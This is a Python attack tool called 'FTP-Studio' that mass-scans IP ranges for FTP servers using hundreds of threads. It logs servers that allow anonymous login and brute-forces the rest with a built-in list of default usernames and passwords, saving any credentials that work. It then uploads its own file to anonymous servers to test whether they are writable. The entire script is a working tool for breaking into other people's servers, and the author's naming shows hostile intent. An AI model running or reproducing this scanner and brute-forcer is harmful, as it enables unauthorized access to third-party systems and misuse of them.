"""
FTP-Studio

FuckThePolice-Studio

Coded by DAMiEN - msg me: damien@cult-of-devil.eu
usage: python3 ftpstudio.py -rf rangefile
rangefile has to look like below:
123.123.123.123-123.123.123.124
124.124.124.124-125.125.125.125
...
or
123.0.0.0/8
124.0.0.0/8
...
automatic portscan, check for anonftp and 'bruteforce' + check for upload permission

v0.8
"""
import ipaddress
import socket
import sys
import threading
import os
import time

threads = 750

def CheckIfOpen(ip):
    s = socket.socket() #creating socket
    s.settimeout(0.8) # setting timeout
    target = (ip,21) #define where to connect to
    try: # try to connect and log successfully
        usr = "USER anonymous\r\n" # set USER command for FTP-Connection
        pwd = "PASS anonymous\r\n"# set PASSWORD command for FTP-Connection
        s.connect(target) # connect
        s.recv(4096) #receive login message
        s.sendall(usr.encode()) # send encoded username
        answer = s.recv(4096) # receiver answer for trying to authenticate
        if "331" in answer.decode('utf-8'): # check if we are allowed to login
            s.sendall(pwd.encode()) # send password if we are able to login as anonymous
            check = s.recv(4096) # receive answer if auth was successful
            if "230" in check.decode('utf-8'): # if login was valid
                print(ip+" Found Pub! Saved! (: \n") # print that we found something
                w = open('found_pub','a') # write the result to file
                w.write(ip+"\n") # 
                w.close() # close the file
                s.close() # close the connection
            elif "530" in check.decode('utf-8'): # same as above
                print(ip+" Not Anonymous. Saved! >.>\n") # print that access is denied
                w = open('ftp2brute','a') # open logfile for results that could be bruteforced
                w.write(ip+"\n") # write to log
                w.close() # close file
                s.close() # close connection
        elif "230" in answer.decode('utf-8'): # if we can login without password, just by typing anonymous as username
            print(ip+" Found Pub! Saved!") # print we found sth.
            w = open('found_pub','a')
            w.write(ip+"\n") # write result to file
            w.close()
            s.close() #close socket
    except: # if no success
        print("Host "+ip+" not reachable! ): \n") # print we did not reach an open port
        s.close() # close socket

def BruteforceFTP(ip):
    users = ["test","ftp","ftpuser","admin","manager","sysadmin","user","pub"] #userlist
    passwords = ["test","ftp","ftpuser","admin","password","ftp123","123","abc123","manager","sysadmin","pub"] #passwordlist
    target = (ip,21) # same as above
    s = socket.socket() #same as above
    s.settimeout(1.5) # same as above
    for user in users: # iterate userlist
        for password in passwords: #iterate passwords
            usr = "USER "+user+"\r\n" # authentication step 1
            pwd = "PASS "+password+"\r\n" #authentication step 2 with line feed to complete command
            try:
                s.connect(target)
                s.recv(4096) # receive login message else no login would be possible
                s.sendall(usr.encode()) # encode the step1 to bytes and send it
                s.recv(4096) # receive answer so we can send step2
                s.sendall(pwd.encode()) # send step2
                answer = s.recv(4096) # retrieve message into variable for if-statement
                if "230" in answer.decode('utf-8'): # check if login successful
                    print("Found Login! Combo: "+user+"/"+password+" on IP: "+ip+"! Saved! (: \n") # print that we found something
                    w = open('bruted_ftp','a') # open file
                    w.write(ip+" login: "+user+"/"+password+"\n") # log result
                    w.close() # close file
                    s.close() # close socket
                    break # exit passwords iteration for new user
                elif "530" in answer.decode('utf-8'): # if login was denied
                    print("Failed login on IP: "+ip+"! ):\n") # print that it was not successful
                    s.close() # forcing to close the connection 
            except: # if an error occured like no ftp service or blacklisted
                pass # go on with next result

def CheckForWritable(ip):
    s = socket.socket() # same as above
    s.settimeout(10) # same as above
    target = (ip,21) # same as above
    usr = "USER anonymous\r\n" # same as above
    pwd = "PASS anonymous\r\n" # same as above
    mode = "TYPE I\r\n" # list with commands that will be used to initiate filetransfer
    psv = "PASV\r\n"
    stor = "STOR ftpstudio.py\r\n"
    s.connect(target)
    s.recv(4096)
    s.send(usr.encode())
    s.recv(4096)
    s.send(pwd.encode())
    s.recv(4096)
    s.send(mode.encode())
    s.recv(4096)
    s.send(psv.encode())
    a = s.recv(8172)
    SRV = a.decode('utf-8').partition('(')
    try:
        SRV = SRV[2].strip(').\r\n')
    except:
        SRV = SRV[2].strip(')\r\n')
    SRV = SRV.split(',') # split server ip and ports indicated by the server while switching to passive mode
    SRV2 = SRV[0]+"."+SRV[1]+"."+SRV[2]+"."+SRV[3] # construct the server ip
    PRT = int(SRV[4])*256
    PRT = int(PRT) + int(SRV[5]) # # calculate the port that's gonna be used
    s.send(stor.encode())
    w = s.recv(4096)
    if "553" in w.decode('utf-8'):
        s.close()
        print("Keine Schreibrechte! ): \n") # print we got no permission
    else:
        ST = socket.socket() # create another socket
        ST.connect((SRV2,int(PRT))) # connect to the ip + port we need for filetransfer using passive mode
        F = open('ftpstudio.py','rb') # open file 1MB.bin in read and binary mode
        tra = F.read() # read first 4096 bytes of our opened file
        ST.sendall(tra) # send all read bytes to the server
        F.close() # if the loop is finished, close the file.
        ST.close() # close our passive mode socket.
        a = s.recv(8172) # receive status code after transfer
        if "226" in a.decode('utf-8'): # if it's completed without errors
            open('writable_pubs','a').write(ip+"\n") # log result
            print("Schreibrechte vorhanden! IP: "+ip+" (: \n") # print that we got write permission to /
            s.close() # close socket
    #except: # if error
    #    print("Failed! \n") # print failed

if sys.argv[1] == "-rf": # if second parameter (first after filename) is -rf
    f = open(sys.argv[2]).read().splitlines() # read the third parameter as a file
    for rng in f: # iterate the ranges from the file specified after -rf
        if "-" in rng: # if we use none-cidr notation
                r = rng.split("-") # split to define start and end ip
                start = ipaddress.IPv4Address(r[0]) # start ip
                end = ipaddress.IPv4Address(r[1]) # end ip
                for address in range(int(start),int(end)+1): # calculate the integers of our both ips and count towards end ip using integers
                    ip = ipaddress.IPv4Address(address) # making an ip from our integer
                    T = threading.Thread(target=CheckIfOpen,args=(str(ip),)) # passing our ip as a readable string to our portscan function with thread
                    if threading.active_count() <= threads: # if current threads are lesser than or equal our maximum
                        T.start() # start the thread
                    else: # if it would be more than our maximum
                        T.start() # start the thread
                        T.join() # join the thread so we got space to start new threads
        elif "/" in rng: # if cidr notation is used
                l = list(ipaddress.ip_network(rng).hosts()) # construc a list of our hosts in the determined subnet
                for address in l: # iterate the hosts
                    ip = str(address) # building ip to string
                    T = threading.Thread(target=CheckIfOpen,args=(ip,)) # same as above
                    if threading.active_count() <= threads: # same as above
                        T.start() # same as above
                    else: # same as above
                        T.start() # same as above
                        T.join() # same as above
    T.join() # same as above
    print("Jetzt werden Logins gecheckt! (: \n") # same as above
    b = open('ftp2brute').read().splitlines() # same as above
    if len(b) > 0: # same as above
        for i in b: # same as above
            B = threading.Thread(target=BruteforceFTP,args=(i,)) # same as above
            if threading.active_count() <= threads: # same as above
                B.start() # same as above
            else: # same as above
                B.start() # same as above
                B.join() # same as above
        B.join() # same as above
    else: # same as above
        print("Keine FTPs die man bruten kann! ): \n") # same as abov
    print("Checke Pubs auf Schreibrechte! (: \n") # same as above
    p = open('found_pub').read().splitlines() # same as above
    if len(p) > 0: # same as above
        for i in p: # same as above
            P = threading.Thread(target=CheckForWritable,args=(i,)) # same as above
            if threading.active_count() <= threads/2: # same as above
                P.start() # same as above
            else: # same as above
                P.start() # same as above
                P.join() # same as above
        P.join() # same as above
    else: # same as above
        print("Keine Pubs zum checken! ): \n") # same as above
        os._exit(1) # same as above
    print("Fertig!\n") # print that we are finished
    os._exit(1) # exit the program